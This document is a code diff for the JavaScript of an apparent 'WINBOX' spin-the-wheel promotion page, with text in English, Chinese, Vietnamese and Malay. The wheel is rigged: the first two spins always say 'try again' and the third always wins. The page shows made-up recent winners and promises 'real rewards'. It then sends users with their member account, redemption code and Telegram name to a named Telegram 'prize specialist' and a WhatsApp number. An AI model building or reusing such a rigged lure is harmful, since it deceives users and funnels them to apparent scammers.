@@ -4,7 +4,7 @@ const button = document.querySelector("#spinButton");
 const centerSpinButton = document.querySelector("#centerSpinButton");
 const message = document.querySelector("#spinMessage");
 const memberName = document.querySelector("#memberName");
-const emailAddress = document.querySelector("#emailAddress");
+const redemptionCode = document.querySelector("#redemptionCode");
 const telegramName = document.querySelector("#telegramName");
 const chanceLabel = document.querySelector("#chanceLabel");
 const chanceCount = document.querySelector("#chanceCount");
@@ -30,9 +30,9 @@ const modalWhatsappButton = document.querySelector("#modalWhatsappButton");
 
 const wheelSlots = ["retry", 38, 88, 108, 188, 288, 588, 888, 288, 588, 888];
 const retrySlot = { prize: "retry", index: 0 };
-const grandPrizeIndexes = wheelSlots
+const obtainablePrizeIndexes = wheelSlots
   .map((prize, index) => ({ prize, index }))
-  .filter(({ prize }) => prize === 888);
+  .filter(({ prize }) => [38, 88, 108, 188].includes(prize));
 
 let rotation = 0;
 let isSpinning = false;
@@ -53,9 +53,10 @@ let isVideoSwiping = false;
 const carouselDelay = 3800;
 const winnerDelay = 2400;
 const specialistTelegram = "jojaeisme";
+const specialistTelegramUrl = `https://t.me/${specialistTelegram}`;
 const specialistWhatsapp = "639073552782";
 const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
-const mockWinnerPrizes = [288, 588, 888, 288, 588, 888, 588, 288, 888, 588];
+const mockWinnerPrizes = [38, 88, 108, 188, 88, 108, 38, 188, 108, 88];
 const mockWinnerSeeds = [
   "li",
   "win",
@@ -102,25 +103,25 @@ const translations = {
     wheelRetry: "Try Again",
     newMember: "NEW MEMBER",
     formTitle: "Claim Eligibility",
-    chanceDefault: "Three chances. Grand prize pending.",
-    chanceTwo: "Try again. The grand prize is getting closer.",
-    chanceOne: "Final spin. Go for the top prize.",
-    chanceLocked: "Grand prize locked.",
+    chanceDefault: "Three chances. Real reward pending.",
+    chanceTwo: "Try again. A real reward is getting closer.",
+    chanceOne: "Final spin. Go for the top real reward.",
+    chanceLocked: "Reward locked.",
     chanceCount: "{count} left",
     memberLabel: "Registered Member Account",
     memberPlaceholder: "Enter your registered member account",
-    emailLabel: "Email Address",
-    emailPlaceholder: "Enter your email address",
+    redemptionCodeLabel: "Redemption Code",
+    redemptionCodePlaceholder: "Enter your redemption code",
     telegramLabel: "Telegram Username",
     telegramPlaceholder: "@telegram",
     spinButton: "Spin the Wheel",
     spinning: "Spinning",
     tryAgainButton: "Try Again",
     finalSpinButton: "Final Spin",
-    prizeLockedButton: "Grand Prize Locked",
-    spinInitialMessage: "Complete registration details to unlock 3 spins toward the grand prize.",
-    missingFields: "Please enter your member account, email address, and Telegram username first.",
-    completedMessage: "This round of 3 chances is complete. Please contact a prize specialist to verify the grand prize.",
+    prizeLockedButton: "Reward Locked",
+    spinInitialMessage: "Complete registration details to unlock 3 spins toward a real obtainable reward.",
+    missingFields: "Please enter your member account, redemption code, and Telegram username first.",
+    completedMessage: "This round of 3 chances is complete. Please contact a prize specialist to verify the reward.",
     matchingPrefix: "Member ",
     matchingSuffix: " is matching a special bonus...",
     winPrefix: "Congratulations ",
@@ -129,7 +130,7 @@ const translations = {
     winContact: " to contact a prize specialist for verification.",
     retryPrefix: "Try again",
     retryMiddle: "! You still have ",
-    retrySuffix: " chance(s) left. The grand prize is unlocking.",
+    retrySuffix: " chance(s) left. A real reward is unlocking.",
     videoTitle: "Winning Videos",
     videoSubtitle:
       "Fresh bonus highlights keep rolling. Watch how others take home 888U and claim the next spotlight.",
@@ -158,7 +159,7 @@ const translations = {
     winModalSubcopy:
       "Contact a prize specialist now. Your claim details will be attached automatically.",
     claimMessage:
-      "Hello WINBOX Prize Specialist, I would like to claim my spin bonus. Member account: {member}. Email: {email}. Telegram: {telegram}. Prize amount: {amount}. Timestamp: {timestamp}. Please help verify and process my reward. Thank you.",
+      "Hello WINBOX Prize Specialist, I would like to claim my spin bonus. Member account: {member}. Redemption code: {redemptionCode}. Telegram: {telegram}. Prize amount: {amount}. Timestamp: {timestamp}. Please help verify and process my reward. Thank you.",
     justClaimed: "Just claimed",
     minutesAgo: "{count} min ago",
   },
@@ -180,25 +181,25 @@ const translations = {
     wheelRetry: "再试一次",
     newMember: "新会员",
     formTitle: "领取资格登记",
-    chanceDefault: "三次机会，大奖待解锁",
-    chanceTwo: "再试一次，大奖接近中",
-    chanceOne: "最后一次，冲刺最高奖",
-    chanceLocked: "大奖已锁定",
+    chanceDefault: "三次机会，真实奖励待解锁",
+    chanceTwo: "再试一次，真实奖励接近中",
+    chanceOne: "最后一次，冲刺最高可领奖励",
+    chanceLocked: "奖励已锁定",
     chanceCount: "剩余 {count} 次",
     memberLabel: "注册会员账号",
     memberPlaceholder: "请输入已注册会员账号",
-    emailLabel: "邮箱地址",
-    emailPlaceholder: "请输入邮箱地址",
+    redemptionCodeLabel: "兑换码",
+    redemptionCodePlaceholder: "请输入兑换码",
     telegramLabel: "Telegram 用户名",
     telegramPlaceholder: "@telegram",
     spinButton: "旋转转盘",
     spinning: "旋转中",
     tryAgainButton: "再试一次",
     finalSpinButton: "最后一转",
-    prizeLockedButton: "大奖已锁定",
-    spinInitialMessage: "完成登记后即可开启礼金转盘，共有 3 次冲刺大奖机会。",
-    missingFields: "请先填写注册会员账号、邮箱地址与 Telegram 用户名。",
-    completedMessage: "本轮 3 次机会已完成，请联系领奖专员核实大奖。",
+    prizeLockedButton: "奖励已锁定",
+    spinInitialMessage: "完成登记后即可开启礼金转盘，共有 3 次冲刺真实奖励机会。",
+    missingFields: "请先填写注册会员账号、兑换码与 Telegram 用户名。",
+    completedMessage: "本轮 3 次机会已完成，请联系领奖专员核实奖励。",
     matchingPrefix: "会员 ",
     matchingSuffix: " 正在匹配专属礼金...",
     winPrefix: "恭喜 ",
@@ -207,7 +208,7 @@ const translations = {
     winContact: " 联系领奖专员核实。",
     retryPrefix: "再试一次",
     retryMiddle: "！还剩 ",
-    retrySuffix: " 机会，大奖正在解锁。",
+    retrySuffix: " 机会，真实奖励正在解锁。",
     videoTitle: "中奖视频",
     videoSubtitle: "真实礼金高光持续更新，看看别人如何把 888U 带走，下一个高光席位等你来占。",
     latestClaim: "最新领奖",
@@ -233,7 +234,7 @@ const translations = {
     winModalCopySuffix: "WINBOX 豪礼转盘奖励。",
     winModalSubcopy: "立即联系领奖专员，系统会自动附上您的领奖资料。",
     claimMessage:
-      "您好 WINBOX 领奖专员，我想领取我的转盘礼金。会员账号：{member}。邮箱：{email}。Telegram：{telegram}。中奖金额：{amount}。时间：{timestamp}。请协助核实并处理奖励，谢谢。",
+      "您好 WINBOX 领奖专员，我想领取我的转盘礼金。会员账号：{member}。兑换码：{redemptionCode}。Telegram：{telegram}。中奖金额：{amount}。时间：{timestamp}。请协助核实并处理奖励，谢谢。",
     justClaimed: "刚刚领取",
     minutesAgo: "{count}分钟前",
   },
@@ -256,25 +257,25 @@ const translations = {
     wheelRetry: "Thử lại",
     newMember: "THÀNH VIÊN MỚI",
     formTitle: "Đăng ký nhận thưởng",
-    chanceDefault: "Ba lượt quay, giải lớn đang chờ.",
-    chanceTwo: "Thử lại, giải lớn đang đến gần.",
+    chanceDefault: "Ba lượt quay, phần thưởng thật đang chờ.",
+    chanceTwo: "Thử lại, phần thưởng thật đang đến gần.",
     chanceOne: "Lượt cuối, nhắm giải cao nhất.",
-    chanceLocked: "Giải lớn đã khóa.",
+    chanceLocked: "Phần thưởng đã khóa.",
     chanceCount: "Còn {count} lượt",
     memberLabel: "Tài khoản thành viên đã đăng ký",
     memberPlaceholder: "Nhập tài khoản thành viên đã đăng ký",
-    emailLabel: "Địa chỉ email",
-    emailPlaceholder: "Nhập địa chỉ email",
+    redemptionCodeLabel: "Mã nhận thưởng",
+    redemptionCodePlaceholder: "Nhập mã nhận thưởng",
     telegramLabel: "Tên Telegram",
     telegramPlaceholder: "@telegram",
     spinButton: "Quay thưởng",
     spinning: "Đang quay",
     tryAgainButton: "Thử lại",
     finalSpinButton: "Lượt cuối",
-    prizeLockedButton: "Đã khóa giải lớn",
-    spinInitialMessage: "Hoàn tất thông tin để mở 3 lượt quay hướng đến giải lớn.",
-    missingFields: "Vui lòng nhập tài khoản thành viên, email và tên Telegram trước.",
-    completedMessage: "Bạn đã dùng hết 3 lượt. Hãy liên hệ chuyên viên để xác minh giải lớn.",
+    prizeLockedButton: "Đã khóa thưởng",
+    spinInitialMessage: "Hoàn tất thông tin để mở 3 lượt quay hướng đến phần thưởng thật.",
+    missingFields: "Vui lòng nhập tài khoản thành viên, mã nhận thưởng và tên Telegram trước.",
+    completedMessage: "Bạn đã dùng hết 3 lượt. Hãy liên hệ chuyên viên để xác minh phần thưởng.",
     matchingPrefix: "Thành viên ",
     matchingSuffix: " đang ghép thưởng đặc biệt...",
     winPrefix: "Chúc mừng ",
@@ -283,7 +284,7 @@ const translations = {
     winContact: " để liên hệ chuyên viên xác minh.",
     retryPrefix: "Thử lại",
     retryMiddle: "! Bạn còn ",
-    retrySuffix: " lượt, giải lớn đang mở khóa.",
+    retrySuffix: " lượt, phần thưởng thật đang mở khóa.",
     videoTitle: "Video trúng thưởng",
     videoSubtitle: "Khoảnh khắc nhận thưởng được cập nhật liên tục. Xem người khác mang 888U về và chiếm spotlight tiếp theo.",
     latestClaim: "Nhận thưởng mới nhất",
@@ -311,7 +312,7 @@ const translations = {
     winModalSubcopy:
       "Liên hệ chuyên viên nhận thưởng ngay. Thông tin nhận thưởng sẽ được đính kèm tự động.",
     claimMessage:
-      "Xin chào Chuyên viên nhận thưởng WINBOX, tôi muốn nhận bonus vòng quay. Tài khoản thành viên: {member}. Email: {email}. Telegram: {telegram}. Số tiền thưởng: {amount}. Thời gian: {timestamp}. Vui lòng hỗ trợ xác minh và xử lý phần thưởng. Cảm ơn.",
+      "Xin chào Chuyên viên nhận thưởng WINBOX, tôi muốn nhận bonus vòng quay. Tài khoản thành viên: {member}. Mã nhận thưởng: {redemptionCode}. Telegram: {telegram}. Số tiền thưởng: {amount}. Thời gian: {timestamp}. Vui lòng hỗ trợ xác minh và xử lý phần thưởng. Cảm ơn.",
     justClaimed: "Vừa nhận",
     minutesAgo: "{count} phút trước",
   },
@@ -334,25 +335,25 @@ const translations = {
     wheelRetry: "Cuba Lagi",
     newMember: "AHLI BARU",
     formTitle: "Kelayakan Tuntutan",
-    chanceDefault: "Tiga peluang. Hadiah utama sedang menanti.",
-    chanceTwo: "Cuba lagi. Hadiah utama semakin hampir.",
+    chanceDefault: "Tiga peluang. Hadiah sebenar sedang menanti.",
+    chanceTwo: "Cuba lagi. Hadiah sebenar semakin hampir.",
     chanceOne: "Putaran terakhir. Sasar hadiah tertinggi.",
-    chanceLocked: "Hadiah utama dikunci.",
+    chanceLocked: "Hadiah dikunci.",
     chanceCount: "Baki {count} kali",
     memberLabel: "Akaun Ahli Berdaftar",
     memberPlaceholder: "Masukkan akaun ahli berdaftar",
-    emailLabel: "Alamat Emel",
-    emailPlaceholder: "Masukkan alamat emel",
+    redemptionCodeLabel: "Kod Penebusan",
+    redemptionCodePlaceholder: "Masukkan kod penebusan",
     telegramLabel: "Nama Pengguna Telegram",
     telegramPlaceholder: "@telegram",
     spinButton: "Putar Roda",
     spinning: "Sedang Berputar",
     tryAgainButton: "Cuba Lagi",
     finalSpinButton: "Putaran Terakhir",
-    prizeLockedButton: "Hadiah Utama Dikunci",
-    spinInitialMessage: "Lengkapkan maklumat untuk membuka 3 putaran menuju hadiah utama.",
-    missingFields: "Sila masukkan akaun ahli, alamat emel dan nama pengguna Telegram dahulu.",
-    completedMessage: "Pusingan 3 peluang ini telah selesai. Sila hubungi pakar hadiah untuk mengesahkan hadiah utama.",
+    prizeLockedButton: "Hadiah Dikunci",
+    spinInitialMessage: "Lengkapkan maklumat untuk membuka 3 putaran menuju hadiah sebenar.",
+    missingFields: "Sila masukkan akaun ahli, kod penebusan dan nama pengguna Telegram dahulu.",
+    completedMessage: "Pusingan 3 peluang ini telah selesai. Sila hubungi pakar hadiah untuk mengesahkan hadiah.",
     matchingPrefix: "Ahli ",
     matchingSuffix: " sedang dipadankan dengan bonus istimewa...",
     winPrefix: "Tahniah ",
@@ -361,7 +362,7 @@ const translations = {
     winContact: " untuk menghubungi pakar hadiah bagi pengesahan.",
     retryPrefix: "Cuba lagi",
     retryMiddle: "! Anda masih ada ",
-    retrySuffix: " peluang. Hadiah utama sedang dibuka.",
+    retrySuffix: " peluang. Hadiah sebenar sedang dibuka.",
     videoTitle: "Video Kemenangan",
     videoSubtitle:
       "Sorotan bonus terkini sentiasa dikemas kini. Lihat cara pemain lain membawa pulang 888U dan rebut giliran sorotan seterusnya.",
@@ -390,7 +391,7 @@ const translations = {
     winModalSubcopy:
       "Hubungi pakar hadiah sekarang. Butiran tuntutan anda akan dilampirkan secara automatik.",
     claimMessage:
-      "Hello Pakar Hadiah WINBOX, saya ingin menuntut bonus putaran saya. Akaun ahli: {member}. Emel: {email}. Telegram: {telegram}. Jumlah hadiah: {amount}. Masa: {timestamp}. Sila bantu sahkan dan proses hadiah saya. Terima kasih.",
+      "Hello Pakar Hadiah WINBOX, saya ingin menuntut bonus putaran saya. Akaun ahli: {member}. Kod penebusan: {redemptionCode}. Telegram: {telegram}. Jumlah hadiah: {amount}. Masa: {timestamp}. Sila bantu sahkan dan proses hadiah saya. Terima kasih.",
     justClaimed: "Baru dituntut",
     minutesAgo: "{count} min lalu",
   },
@@ -451,16 +452,15 @@ function pickRetryOutcome() {
   };
 }
 
-function pickGrandPrizeOutcome() {
+function pickWinningPrizeOutcome() {
   return {
-    ...grandPrizeIndexes[Math.floor(Math.random() * grandPrizeIndexes.length)],
+    ...obtainablePrizeIndexes[Math.floor(Math.random() * obtainablePrizeIndexes.length)],
     isWin: true,
-    label: "888U",
   };
 }
 
 function pickSpinOutcome() {
-  return spinsUsed + 1 >= 3 ? pickGrandPrizeOutcome() : pickRetryOutcome();
+  return spinsUsed + 1 >= 3 ? pickWinningPrizeOutcome() : pickRetryOutcome();
 }
 
 function updateChanceMeter() {
@@ -719,12 +719,12 @@ function launchConfetti() {
   }
 }
 
-function createClaimDetails(amount, member, email, telegram) {
+function createClaimDetails(amount, member, redemptionCodeValue, telegram) {
   const timestamp = new Date().toISOString();
 
   return {
     member,
-    email,
+    redemptionCode: redemptionCodeValue,
     telegram: normalizeTelegramName(telegram),
     amount,
     timestamp,
@@ -857,6 +857,10 @@ function stopCarousel() {
   window.clearInterval(carouselTimer);
 }
 
+function openSpecialistTelegram() {
+  window.open(specialistTelegramUrl, "_blank", "noopener,noreferrer");
+}
+
 if (carousel && slides.length) {
   const beforeClones = originalSlides.map((slide) => {
     const clone = slide.cloneNode(true);
@@ -874,6 +878,17 @@ if (carousel && slides.length) {
   carouselTrack.prepend(...beforeClones);
   carouselTrack.append(...afterClones);
   slides = Array.from(carouselTrack.querySelectorAll(".promo-slide"));
+  slides.forEach((slide) => {
+    slide.setAttribute("role", "link");
+    slide.setAttribute("tabindex", "0");
+    slide.addEventListener("click", openSpecialistTelegram);
+    slide.addEventListener("keydown", (event) => {
+      if (event.key === "Enter" || event.key === " ") {
+        event.preventDefault();
+        openSpecialistTelegram();
+      }
+    });
+  });
   activeTrackIndex = originalSlides.length;
   showBanner(activeTrackIndex, "auto");
 
@@ -1095,10 +1110,10 @@ form.addEventListener("submit", (event) => {
   }
 
   const member = memberName.value.trim();
-  const email = emailAddress.value.trim();
+  const redemptionCodeValue = redemptionCode.value.trim();
   const telegram = telegramName.value.trim().replace(/\s+/g, "");
 
-  if (!member || !email || !telegram) {
+  if (!member || !redemptionCodeValue || !telegram) {
     showMessage(t("missingFields"));
     form.reportValidity();
     return;
@@ -1143,7 +1158,7 @@ form.addEventListener("submit", (event) => {
 
     if (selected.isWin) {
       const amount = `${selected.prize}U`;
-      const claim = createClaimDetails(amount, member, email, telegram);
+      const claim = createClaimDetails(amount, member, redemptionCodeValue, telegram);
       storeClaimDetails(claim);
       button.disabled = true;
       if (centerSpinButton) {
